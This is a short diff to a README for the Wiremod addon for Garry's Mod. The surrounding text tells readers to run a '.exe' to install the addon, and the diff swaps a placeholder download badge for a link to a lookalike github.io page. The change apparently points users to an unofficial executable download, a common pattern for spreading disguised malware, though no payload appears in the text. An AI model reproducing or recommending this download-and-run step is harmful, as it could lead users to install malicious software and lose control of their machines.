@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install Wiremod automatically into your Garry’s Mod addons directory.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://wiremod-garrys-mod.github.io/.github/)
 
 ## 📸 Overview
 ![wiremod-processors](https://github.com/user-attachments/assets/f19daf9c-71f2-4738-932b-fb29e0d9ce88)
